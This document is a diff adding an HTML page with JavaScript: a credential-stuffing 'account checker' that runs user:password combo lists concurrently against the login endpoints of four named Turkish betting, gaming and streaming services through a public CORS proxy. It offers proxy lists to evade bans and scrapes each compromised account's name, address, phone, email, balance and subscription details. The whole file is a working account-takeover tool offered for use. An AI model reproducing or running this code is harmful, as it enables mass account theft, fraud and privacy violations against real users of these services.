@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Serverless Account Checker</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 20px; 
+            background-color: #f4f4f4; 
+        }
+        select, textarea, input, button { 
+            display: block; 
+            margin: 10px 0; 
+            width: 100%; 
+            padding: 10px; 
+            border-radius: 5px; 
+            border: 1px solid #ccc; 
+        }
+        textarea { 
+            height: 200px; 
+            resize: vertical; 
+        }
+        button { 
+            background-color: #28a745; 
+            color: white; 
+            border: none; 
+            cursor: pointer; 
+            font-size: 16px; 
+        }
+        button:hover { 
+            background-color: #218838; 
+        }
+        #results { 
+            white-space: pre-wrap; 
+            background: white; 
+            padding: 15px; 
+            border-radius: 5px; 
+            border: 1px solid #ddd; 
+        }
+        .hit { 
+            color: green; 
+            font-weight: bold; 
+        }
+        .bad { 
+            color: red; 
+        }
+        .note { 
+            color: orange; 
+            font-weight: bold; 
+            background: #fff3cd; 
+            padding: 10px; 
+            border-radius: 5px; 
+        }
+        #progress { 
+            width: 100%; 
+            height: 20px; 
+            background: #ddd; 
+            border-radius: 5px; 
+            overflow: hidden; 
+        }
+        #progress-bar { 
+            height: 100%; 
+            background: #28a745; 
+            width: 0; 
+            transition: width 0.3s; 
+        }
+        #status { 
+            margin-top: 10px; 
+            font-size: 14px; 
+        }
+        #stats { 
+            margin-top: 10px; 
+            font-weight: bold; 
+        }
+        a { 
+            color: #007bff; 
+            text-decoration: none; 
+        }
+        a:hover { 
+            text-decoration: underline; 
+        }
+    </style>
+</head>
+<body>
+    <h1>Advanced Serverless Account Checker</h1>
+    <p class="note">Important: This is a client-side checker running in your browser. Due to CORS restrictions, we use a public CORS proxy (cors-anywhere.herokuapp.com). Before starting, visit <a href="https://cors-anywhere.herokuapp.com/corsdemo" target="_blank">this link</a> and request temporary access. All requests use the proxy's IP, not individual proxies. Proxies are provided for download below and should be used with external tools like Silver Bullet for full proxy support.</p>
+    <p class="note">For configs like Ssport, bans may occur quickly due to shared IP. Download proxies and use external tools for proxy-enabled checking. Features: Multi-bot concurrent checks, progress bar, CPM calculation, hit/bad counters.</p>
+
+    <label for="config">Select Config to Check:</label>
+    <select id="config">
+        <option value="ezglobal">EzGlobal</option>
+        <option value="tuttur">Tuttur</option>
+        <option value="s2gepin">S2gepin</option>
+        <option value="ssport">Ssport</option>
+    </select>
+
+    <label for="combos">Enter Combos (user:pass one per line):</label>
+    <textarea id="combos" placeholder="user1:pass1\nuser2:pass2"></textarea>
+
+    <label for="bots">Number of Bots (Concurrent Checks):</label>
+    <input type="number" id="bots" value="5" min="1" max="20">
+
+    <button onclick="startChecking()">Start Checking</button>
+
+    <div id="progress"><div id="progress-bar"></div></div>
+    <div id="status"></div>
+    <div id="stats">Hits: 0 | Bads: 0 | CPM: 0</div>
+
+    <h2>Results:</h2>
+    <div id="results"></div>
+
+    <h2>Download Proxies:</h2>
+    <a href="/proxies/SOCKS5_proxies.txt" download>Download SOCKS5 Proxies</a><br>
+    <a href="/proxies/HTTP_proxies.txt" download>Download HTTP Proxies</a><br>
+    <a href="/proxies/SOCKS4_proxies.txt" download>Download SOCKS4 Proxies</a>
+
+    <script>
+        const corsProxy = 'https://cors-anywhere.herokuapp.com/';
+        const resultsDiv = document.getElementById('results');
+        const progressBar = document.getElementById('progress-bar');
+        const statusDiv = document.getElementById('status');
+        const statsDiv = document.getElementById('stats');
+        let hits = 0, bads = 0, totalChecked = 0, startTime;
+
+        async function startChecking() {
+            resultsDiv.innerHTML = '';
+            hits = 0;
+            bads = 0;
+            totalChecked = 0;
+            startTime = Date.now();
+            updateStats();
+
+            const config = document.getElementById('config').value;
+            const combos = document.getElementById('combos').value.trim().split('\n').filter(combo => combo);
+            const botCount = parseInt(document.getElementById('bots').value) || 5;
+            const totalCombos = combos.length;
+            let checkedCombos = 0;
+
+            statusDiv.textContent = `Starting ${botCount} bots to check ${totalCombos} combos...`;
+
+            const checkBatch = async (batch) => {
+                for (let combo of batch) {
+                    if (!combo) continue;
+                    const [user, pass] = combo.split(':');
+                    if (!user || !pass) {
+                        appendResult(`Bad format: ${combo}`, 'bad');
+                        bads++;
+                        checkedCombos++;
+                        updateProgress(checkedCombos, totalCombos);
+                        updateStats();
+                        continue;
+                    }
+                    try {
+                        let result = await checkCombo(config, user, pass);
+                        appendResult(result, result.includes('HIT') ? 'hit' : 'bad');
+                        if (result.includes('HIT')) hits++;
+                        else bads++;
+                    } catch (error) {
+                        appendResult(`Error on ${combo}: ${error.message}`, 'bad');
+                        bads++;
+                    }
+                    checkedCombos++;
+                    updateProgress(checkedCombos, totalCombos);
+                    updateStats();
+                }
+            };
+
+            const batches = [];
+            for (let i = 0; i < combos.length; i += Math.ceil(combos.length / botCount)) {
+                batches.push(combos.slice(i, i + Math.ceil(combos.length / botCount)));
+            }
+
+            const cpmInterval = setInterval(updateCPM, 1000);
+            await Promise.all(batches.map(batch => checkBatch(batch)));
+            clearInterval(cpmInterval);
+            statusDiv.textContent = `Checking complete! Total: ${totalCombos}, Hits: ${hits}, Bads: ${bads}`;
+        }
+
+        function updateProgress(checked, total) {
+            const percentage = (checked / total) * 100;
+            progressBar.style.width = `${percentage}%`;
+        }
+
+        function updateCPM() {
+            const elapsedMinutes = (Date.now() - startTime) / 60000;
+            const cpm = elapsedMinutes > 0 ? Math.round(totalChecked / elapsedMinutes) : 0;
+            statsDiv.textContent = `Hits: ${hits} | Bads: ${bads} | CPM: ${cpm}`;
+        }
+
+        function updateStats() {
+            totalChecked = hits + bads;
+            updateCPM();
+        }
+
+        function appendResult(text, className) {
+            const p = document.createElement('p');
+            p.textContent = text;
+            p.className = className;
+            resultsDiv.appendChild(p);
+            resultsDiv.scrollTop = resultsDiv.scrollHeight;
+        }
+
+        async function checkCombo(config, user, pass) {
+            if (config === 'ezglobal') {
+                return await checkEzGlobal(user, pass);
+            } else if (config === 'tuttur') {
+                return await checkTuttur(user, pass);
+            } else if (config === 's2gepin') {
+                return await checkS2gepin(user, pass);
+            } else if (config === 'ssport') {
+                return await checkSsport(user, pass);
+            }
+        }
+
+        async function fetchWithCors(url, options = {}) {
+            try {
+                return await fetch(corsProxy + url, options);
+            } catch (error) {
+                throw new Error(`CORS proxy error: ${error.message}. Ensure you have requested access at cors-anywhere.herokuapp.com/corsdemo.`);
+            }
+        }
+
+        async function checkEzGlobal(user, pass) {
+            const loginRes = await fetchWithCors('https://www.ezglobalyazilim.com/ajax.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `s1=uyelik&s2=islem&islem=gir&refuser=0&eposta=${encodeURIComponent(user)}&sifre=${encodeURIComponent(pass)}&ajtip=eval`
+            });
+            const loginText = await loginRes.text();
+            if (loginText.includes("console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadır.`);")) {
+                return `BAD: ${user}:${pass}`;
+            }
+            if (!loginText.includes('{"$type":"System.Collections.Generic.List`1[[RuriLib.BlockBase, RuriLib]], mscorlib","$values":[{"$type":"RuriLib.BlockKeycheck, RuriLib"')) {
+                return `BAD: ${user}:${pass}`;
+            }
+
+            const profilRes = await fetchWithCors('https://www.ezglobalyazilim.com/hesabim/profil.html', { method: 'POST' });
+            const profilText = await profilRes.text();
+            const isim = extractBetween(profilText, '<input id="gb_ad" type="text" value="', '" class="form-control" required="">') || '';
+            const soyisim = extractBetween(profilText, '<input id="gb_soyad" type="text" value="', '" class="form-control" required="">') || '';
+            const adres = extractBetween(profilText, '<input id="gb_adres" type="text" value="', '" class="form-control">') || '';
+            const telefon = extractBetween(profilText, '<input id="gb_telefon" type="text" value="', '" class="form-control">') || '';
+            const mail = extractBetween(profilText, '<input id="gb_eposta" type="email" value="', '" class="form-control">') || '';
+
+            const programRes = await fetchWithCors('https://www.ezglobalyazilim.com/hesabim/program.html', { method: 'POST' });
+            const programText = await programRes.text();
+            const kullanim = extractBetween(programText, '<div class="fsize-24 fweight-700 font-agency color-white">', '</div>') || '';
+
+            return `HIT: ${user}:${pass} | İsim: ${isim} | Soyisim: ${soyisim} | Adres: ${adres} | Telefon: ${telefon} | Mail: ${mail} | Kullanım süresi: ${kullanim}`;
+        }
+
+        async function checkTuttur(user, pass) {
+            const loginRes = await fetchWithCors('https://tapi.tuttur.com/v1/auth/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientId: 'Web-New', clientToken: '7b12xz9gj608sw2zkaazf6y0ivhw8yqx', password: pass, remember: true, username: user })
+            });
+            const loginJson = await loginRes.json();
+            if (!loginJson.success) {
+                return `BAD: ${user}:${pass}`;
+            }
+            const token = loginJson.token;
+
+            const balanceRes = await fetchWithCors('https://tapi.tuttur.com/v1/player/balance', {
+                headers: { 'token': token }
+            });
+            const balanceJson = await balanceRes.json();
+            const bakiye = balanceJson.realMoney || 0;
+
+            return `HIT: ${user}:${pass} | Bakiye: ${bakiye} | sezin`;
+        }
+
+        async function checkS2gepin(user, pass) {
+            const loginRes = await fetchWithCors('https://api.s2gepin.com/Login/Customer', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: user, password: pass, otpcode: null, CaptchaToken: 'none' })
+            });
+            const loginJson = await loginRes.json();
+            if (!loginJson.success) {
+                return `BAD: ${user}:${pass}`;
+            }
+            const token = loginJson.data;
+
+            const walletRes = await fetchWithCors('https://www.s2gepin.com/cuzdan?page=1', {
+                headers: { 'Authorization': `Bearer ${token}` }
+            });
+            const walletText = await walletRes.text();
+            const bakiye = extractBetween(walletText, '<p class="amount totalbalance">', '<') || '0';
+
+            return `HIT: ${user}:${pass} | Bakiye: ${bakiye} | Author: sezin crackermain.net`;
+        }
+
+        async function checkSsport(user, pass) {
+            await fetchWithCors('https://api.ssportplus.com/MW/SubscriberLogin', { method: 'OPTIONS' });
+            const loginRes = await fetchWithCors('https://api.ssportplus.com/MW/SubscriberLogin', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: 'SubscriberLogin', subscriber: { LoginPreferedMethod: 0, UILanguage: 'tr', Email: user, PIN: pass }, Devices: [{ PlatformID: 10 }], TSID: Math.floor(Date.now() / 1000), SNGT: '282633486942740668772593320738' })
+            });
+            const loginText = await loginRes.text();
+            if (loginText.includes('"SessionIsAlive": false') || loginText.includes('E-Posta adresinizi ve / veya Şifrenizi hatalı girdiniz.')) {
+                return `BAD: ${user}:${pass}`;
+            }
+            if (!loginText.includes('"Description":"Success"') && !loginText.includes('"SubscriberID":')) {
+                return `BAD: ${user}:${pass}`;
+            }
+
+            const firstName = extractBetween(loginText, '"FirstName":"', '"') || '';
+            const lastName = extractBetween(loginText, 'astName":"', '",') || '';
+            const packageName = extractBetween(loginText, '"PackageName":"', '"') || 'Free';
+            const autoRenew = extractBetween(loginText, '"AutoRenew":', ',') === 'true' ? '✔' : '✖';
+            const phone = extractBetween(loginText, 'PhoneNumber":"', '",') || '';
+            const brand = extractBetween(loginText, '"Brand":"', ' NT","Model":') || '';
+            const promo = extractBetween(loginText, 'PromoCode":"', '",') || '';
+
+            let membership = packageName === 'Free' ? '✖' : packageName;
+
+            return `HIT: ${user}:${pass} | Ad Soyad: ${firstName} ${lastName} | Üyelik Türü: ${membership} | Yenilenecek: ${autoRenew} | Tel No: ${phone} | Son Giriş: ${brand.replace('Windows', 'Web')} | Promosyon Kodu: ${promo} | by: sezin`;
+        }
+
+        function extractBetween(text, start, end) {
+            const startIndex = text.indexOf(start);
+            if (startIndex === -1) return '';
+            const endIndex = text.indexOf(end, startIndex + start.length);
+            if (endIndex === -1) return '';
+            return text.substring(startIndex + start.length, endIndex);
+        }
+    </script>
+</body>
+</html>
